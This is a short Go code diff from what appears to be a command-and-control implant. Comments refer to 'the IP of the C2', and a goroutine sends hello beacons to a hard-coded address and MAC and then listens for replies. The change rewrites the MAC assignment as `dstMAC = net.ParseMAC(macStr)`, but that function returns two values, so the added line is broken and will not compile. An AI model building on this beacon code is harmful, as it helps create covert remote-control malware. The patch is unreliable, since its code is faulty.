@@ -459,7 +459,9 @@ func main() {
 	// Start hello timer
 	// Set the below IP to the IP of the C2
 	// 192.168.4.6
-	dstMAC = "00:1b:17:00:01:11"
+	macStr := "00:1b:17:00:01:11"
+	dstMAC = net.ParseMAC(macStr)
+	
 	go sendHello(iface, src, net.IPv4(172, 25, 41, 11), dstMAC)
 
 	// Listen for responses
